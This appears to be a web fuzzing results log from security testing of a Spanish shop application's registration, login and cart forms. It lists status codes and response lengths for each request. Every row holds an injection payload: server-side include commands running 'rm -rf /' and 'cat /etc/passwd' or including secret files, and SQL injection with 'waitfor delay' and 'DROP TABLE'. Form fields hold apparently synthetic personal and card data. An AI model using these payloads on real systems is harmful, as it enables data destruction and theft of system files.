Request	Payload	Status code	Response received	Error	Timeout	Length	Comment
281	"registro | nill | 2739n83d$46 | Yael | Paladell Perramon | brandauer@barnicesuv.td | 31914466B | Calle Corpo Santo, 11 6G | Canales de la Sierra | 22220 | <!--#EXEC cmd=""ls /""--> | 335091081301 ...	200	136	false	false	4075	
194	"registro | hormoz | 79Ari68 | Tamar | Unger | ferrandis@ilusionarium.is | 27110453P | C/ Tampa, 34  | Molares, Los""><!--#EXEC cmd=""dir ""-->< | 05410 | Teruel | 7701457023954310 | Registrar HTT ...	200	114	false	false	4071	
124	"registro | jakabffy | 33aRr179 | VahidReza | Curell Lagares | moura@chicasdiabolo.iq | 75130756Z | Urbanizacion Montesion, 3  | Molinaseca | 45180 | <!--#EXEC cmd=""ls /""--> | 2571648203429012 | ...	200	106	false	false	4069	
64	"registro | alane | 9u7Je | Ignolinda | Motta | fargue-innis@soycastellano.no | 04469375S | Calle Melchor Cobo Medina, 16, 6H | Andorra | 09129 | <!--#EXEC cmd=""ls /""--> | 1134011255413195 | Reg ...	200	126	false	false	4065	
227	"registro | peers | at222a1 | Cipriana | Serradell | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 19247264J | C/ Joventut, 182,  | Alegia | 31510 | Salamanca | 8765134980053757 | Registrar HTT ...	200	89	false	false	4055	
195	"registro | yingcdi | pisa-verde | Vianella | Galdeano Piccech | dudgeon@tradora.na | 80818838N | <!--#EXEC cmd=""ls /""--> | Gormaz | 32737 | Zaragoza | 0673547824413217 | Registrar HTTP/1.1"	200	75	false	false	4045	
221	"entrar | beate | esp8rtillero<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | off | Entrar HTTP/1.1"	200	82	false	false	3954	
325	"entrar | krishna | 3o?964I7A1 | on | Entrar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	98	false	false	3953	
166	"entrar""><!--#EXEC cmd=""dir ""-->< | abdullah | cOrcusIdO | on | Entrar HTTP/1.1"	200	115	false	false	3952	
349	"entrar | wing-man7""><!--#EXEC cmd=""dir ""-->< | edific9r | on | Entrar HTTP/1.1"	200	76	false	false	3952	
32	"entrar | satta | es699601r | on<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Entrar HTTP/1.1"	200	127	false	false	3950	
49	"entrar | yansun | 03s6ig89<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1"	200	105	false	false	3950	
137	"entrar | mcnair | 81cob6r | off<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Entrar HTTP/1.1"	200	96	false	false	3950	
339	"entrar | corace | ahorrAdOr | ""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1"	200	104	false	false	3948	
354	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | world.fa | entremeter | on | Entrar HTTP/1.1"	200	79	false	false	3948	
26	"entrar | lutz | OpimA | off""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1"	200	77	false	false	3945	
141	"entrar | toole | e9ternecer | on | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	103	false	false	3945	
282	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | darb2 | h4_Bi651A2 | on | Entrar HTTP/1.1"	200	87	false	false	3945	
118	"entrar | lyliston | ""><!--#EXEC cmd=""dir ""-->< | off | Entrar HTTP/1.1"	200	91	false	false	3944	
144	"entrar | ovas<!--#include file=""archivo_secreto"" --> | ric8Me6te | on | Entrar HTTP/1.1"	200	102	false	false	3944	
358	"entrar | ""><!--#EXEC cmd=""dir ""-->< | 1Ece57aL | off | Entrar HTTP/1.1"	200	83	false	false	3944	
30	"entrar | arro | CarMinAR<!--#include file=""archivo_secreto"" --> | on | Entrar HTTP/1.1"	200	130	false	false	3943	
70	"entrar | leppert | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1"	200	119	false	false	3943	
277	"""><!--#EXEC cmd=""dir ""-->< | swen | incisorio | off | Entrar HTTP/1.1"	200	156	false	false	3943	
57	"entrar | <!--#include file=""archivo_secreto"" --> | COnSO0atiVO | on | Entrar HTTP/1.1"	200	77	false	false	3942	
218	"insertar | 1881<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	115	false	false	3942	
311	"insertar | 3858 | Pasar por caja<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	113	false	false	3942	
362	"insertar | 1202<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	124	false	false	3942	
123	"entrar | wylie | ""><!--#EXEC cmd=""dir ""-->< | off | Entrar HTTP/1.1"	200	87	false	false	3941	
279	"3 | Queso Manchego | 39 | 86 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	152	false	false	3941	
315	"insertar | 622<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	113	false	false	3941	
326	"entrar | moyna | arable | on | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	98	false	false	3941	
346	"3 | Queso Manchego | 39 | 28 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	98	false	false	3941	
212	"insertar | 401""><!--#EXEC cmd=""dir ""-->< | Pasar por caja HTTP/1.1"	200	88	false	false	3940	
63	"insertar | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"	200	70	false	false	3938	
102	"entrar | maijala | <!--#include file=""archivo_secreto"" --> | on | Entrar HTTP/1.1"	200	92	false	false	3938	
117	"insertar | 7686 | Pasar por caja<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	97	false	false	3937	
147	"insertar | 3748 | Pasar por caja<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	102	false	false	3937	
160	"insertar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 9874 | Confirmar HTTP/1.1"	200	74	false	false	3937	
238	"insertar | ""><!--#EXEC cmd=""dir ""-->< | Pasar por caja HTTP/1.1"	200	90	false	false	3937	
251	"insertar | 5562<!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1"	200	70	false	false	3937	
264	"insertar | 6071<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Confirmar HTTP/1.1"	200	74	false	false	3937	
321	"insertar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 5191 | Confirmar HTTP/1.1"	200	72	false	false	3937	
356	"2 | Vino Rioja | 85 | 83 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	104	false	false	3937	
28	"insertar""><!--#EXEC cmd=""dir ""-->< | 8962 | Confirmar HTTP/1.1"	200	77	false	false	3936	
109	"3 | Vino Rioja | 85 | 80 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	86	false	false	3936	
217	"insertar | 6276""><!--#EXEC cmd=""dir ""-->< | Confirmar HTTP/1.1"	200	115	false	false	3936	
303	"insertar | 4628 | Confirmar""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	86	false	false	3936	
336	"entrar | <!--#include file=""archivo_secreto"" --> | juma | on | Entrar HTTP/1.1"	200	113	false	false	3935	
27	"Credenciales incorrectas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	76	false	false	3934	
43	"Credenciales incorrectas""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	99	false	false	3933	
52	"entrar | wolfie8 | antagallar | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	80	false	false	3933	
90	"entrar | hanneke<!--#EXEC cmd=""ls /""--> | dESHILadIZ | off | Entrar HTTP/1.1"	200	71	false	false	3933	
287	"entrar | corvo | 4mbel0c11362<!--#EXEC cmd=""ls /""--> | off | Entrar HTTP/1.1"	200	122	false	false	3933	
333	"insertar | <!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1"	200	114	false	false	3933	
59	"insertar | 1510<!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1"	200	101	false	false	3932	
140	"insertar | ""><!--#EXEC cmd=""dir ""-->< | Confirmar HTTP/1.1"	200	76	false	false	3932	
214	"insertar<!--#include file=""archivo_secreto"" --> | 6858 | Confirmar HTTP/1.1"	200	69	false	false	3932	
241	"entrar | shoouyu | 06434Q969o | on<!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"	200	76	false	false	3932	
283	"insertar<!--#include file=""archivo_secreto"" --> | 4179 | Confirmar HTTP/1.1"	200	87	false	false	3932	
42	"Credenciales incorrectas<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	99	false	false	3929	
107	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 8166 | Confirmar HTTP/1.1"	200	73	false	false	3929	
154	"<!--#include file=""archivo_secreto"" --> | 6471 | Pasar por caja HTTP/1.1"	200	71	false	false	3929	
183	"<!--#include file=""archivo_secreto"" --> | 6458 | Pasar por caja HTTP/1.1"	200	105	false	false	3929	
234	"<!--#include file=""archivo_secreto"" --> | 3086 | Pasar por caja HTTP/1.1"	200	73	false	false	3929	
255	"entrar | cristi<!--#EXEC cmd=""ls /""--> | corac27o | on | Entrar HTTP/1.1"	200	85	false	false	3929	
39	"entrar | espinosa | candado | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"	200	115	false	false	3928	
132	"insertar | 7436 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	105	false	false	3928	
148	"<!--#EXEC cmd=""ls /""--> | crowder | 6.en0e6at2da | on | Entrar HTTP/1.1"	200	102	false	false	3928	
249	"insertar | <!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1"	200	84	false	false	3928	
21	"insertar | 6801 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	112	false	false	3927	
135	"insertar | 7730 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	96	false	false	3927	
171	"insertar | 4981 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	117	false	false	3927	
259	"entrar<!--#EXEC cmd=""ls /""--> | edik3 | a6mi9a2 | on | Entrar HTTP/1.1"	200	75	false	false	3927	
288	"entrar | nezm | 1Eb5l0e | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	76	false	false	3927	
301	"insertar | 9671 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	72	false	false	3927	
367	"insertar | 6771 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	170	false	false	3927	
162	"entrar | crommie | 0eju0o | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"	200	67	false	false	3926	
4	"Vaciar carrito<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	81	false	false	3924	
368	"entrar | <!--#EXEC cmd=""ls /""--> | +ad7quie7 | on | Entrar HTTP/1.1"	200	167	false	false	3924	
16	"Vaciar carrito""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	119	false	false	3923	
108	"insertar | 4975 | <!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	105	false	false	3923	
271	"<!--#EXEC cmd=""ls /""--> | chetan | tontuela | on | Entrar HTTP/1.1"	200	92	false	false	3923	
363	"insertar | 4236 | <!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	170	false	false	3923	
237	"entrar | gavens0 | <!--#EXEC cmd=""ls /""--> | on | Entrar HTTP/1.1"	200	89	false	false	3922	
76	"insertar<!--#EXEC cmd=""ls /""--> | 3845 | Pasar por caja HTTP/1.1"	200	115	false	false	3921	
119	"insertar | 6525 | Pasar por caja<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	77	false	false	3921	
149	"2 | Queso Manchego | 100 | 44 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	73	false	false	3921	
192	"insertar | 3212<!--#EXEC cmd=""ls /""--> | Pasar por caja HTTP/1.1"	200	89	false	false	3921	
253	"1 | Queso Manchego | 39 | 59 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	83	false	false	3920	
327	"3 | Queso Manchego | 39 | 67 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	117	false	false	3920	
100	"Vaciar carrito<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	93	false	false	3919	
15	"insertar | <!--#EXEC cmd=""ls /""--> | Pasar por caja HTTP/1.1"	200	80	false	false	3917	
242	"insertar | 88 | Confirmar<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	69	false	false	3914	
130	"Credenciales incorrectas<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	111	false	false	3913	
82	"2<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	115	false	false	3911	
111	"1<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	85	false	false	3911	
17	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	119	false	false	3910	
37	"1""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	115	false	false	3910	
239	"2""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	78	false	false	3910	
2	"""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	141	false	false	3909	
223	"insertar | 8496 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	92	false	false	3907	
247	"<!--#EXEC cmd=""ls /""--> | 346 | Confirmar HTTP/1.1"	200	82	false	false	3907	
31	"1<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	87	false	false	3906	
67	"2<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	189	false	false	3906	
289	"insertar | 810 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	121	false	false	3906	
10	"<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	136	false	false	3905	
93	"Vaciar carrito<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	102	false	false	3903	
128	"1<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	74	false	false	3890	
230	"2<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	89	false	false	3890	
87	"<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	74	false	false	3889	
369		200	141	false	false	3817	
1	"insertar | 183','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1"	500	96	false	false	2619	
3	"1','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	141	false	false	2619	
5	');waitfor delay '0:0:15';-- HTTP/1.1	500	98	false	false	2619	
6	"','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	98	false	false	2619	
8	"registro | nyberg | predicha | Carmina | Serarols Ginesta | redford2@enlanzarote.com.cz | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 5782200649154235 | ';waitfor delay '0:0:15' ...	500	140	false	false	2619	
9	Vaciar carrito'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	140	false	false	2619	
11	1');waitfor delay '0:0:15';-- HTTP/1.1	500	92	false	false	2619	
12	"Credenciales incorrectas','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	109	false	false	2619	
13	');waitfor delay '0:0:15';-- | 4762 | Confirmar HTTP/1.1	500	109	false	false	2619	
14	"Vaciar carrito','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	109	false	false	2619	
18	"','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	120	false	false	2619	
19	insertar | 7641 | ';waitfor delay '0:0:15';-- HTTP/1.1	500	120	false	false	2619	
20	"entrar | dadang','0','0');waitfor delay '0:0:15';-- | 6a1er87 | on | Entrar HTTP/1.1"	500	83	false	false	2619	
22	"insertar | 4639 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	111	false	false	2619	
23	'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	112	false	false	2619	
25	"3 | Vino Rioja | 39 | 69 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	77	false	false	2619	
29	"insertar | 898 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	77	false	false	2619	
33	"registro | mccarron | revistero | Adelqui | Valente Sanchis','0');waitfor delay '0:0:15';-- | gargen@007tv.zw | 83296238J | C/ Fuente Morena, 146,  | Rillo | 17752 | Lleida | 3359754319393302 | R ...	500	84	false	false	2619	
34	';waitfor delay '0:0:15';-- HTTP/1.1	500	72	false	false	2619	
35	"insertar | 795 | Pasar por caja','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	115	false	false	2619	
36	"registro | dido | enmarch3tar | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | '; DROP TA ...	500	116	false	false	2619	
38	"entrar | espinosa | candado | off','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	78	false	false	2619	
40	"Vaciar carrito','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	80	false	false	2619	
41	"','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	88	false	false	2619	
44	insertar | 2860 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1	500	84	false	false	2619	
45	insertar | ');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1	500	79	false	false	2619	
46	"registro | muise | l321n2c3r','0','0','0');waitfor delay '0:0:15';-- | Matco | Yera Patriz | bacall@djbroadcast.hk | 75976186X | Calle Garcia Arista 97, 6?B | Betancuria | 34191 | Cuenca | 991780 ...	500	105	false	false	2619	
47	"2','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	103	false	false	2619	
48	1';waitfor delay '0:0:15';-- HTTP/1.1	500	105	false	false	2619	
50	"entrar | yansun | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	85	false	false	2619	
51	"','0');waitfor delay '0:0:15';-- | 9805 | Pasar por caja HTTP/1.1"	500	103	false	false	2619	
53	"1','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	103	false	false	2619	
54	');waitfor delay '0:0:15';-- | 4564 | Confirmar HTTP/1.1	500	85	false	false	2619	
55	"','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	85	false	false	2619	
56	insertar | 8789 | ');waitfor delay '0:0:15';-- HTTP/1.1	500	101	false	false	2619	
60	Vaciar carrito');waitfor delay '0:0:15';-- HTTP/1.1	500	101	false	false	2619	
61	1'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	78	false	false	2619	
62	entrar | alvarez | 9ec828'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | on | Entrar HTTP/1.1	500	93	false	false	2619	
65	insertar | 342 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1	500	125	false	false	2619	
66	"Credenciales incorrectas','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	189	false	false	2619	
68	Credenciales incorrectas');waitfor delay '0:0:15';-- HTTP/1.1	500	119	false	false	2619	
69	"registro | diahann | mARcel_iNo | Asad | Tonato Valle | grizzard@ytv.com.mv | 75976186X | C/ Juan De Lara 115, 9?A | Mazcuerras','0','0','0','0');waitfor delay '0:0:15';-- | 43393 | Valencia | 84 ...	500	189	false	false	2619	
71	"insertar','0','0','0');waitfor delay '0:0:15';-- | 8588 | Confirmar HTTP/1.1"	500	184	false	false	2619	
72	insertar | 8588 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	162	false	false	2619	
73	"entrar | drusie | cAreRa','0','0','0','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	152	false	false	2619	
74	"insertar | 5741 | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	101	false	false	2619	
75	"entrar | burch | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	103	false	false	2619	
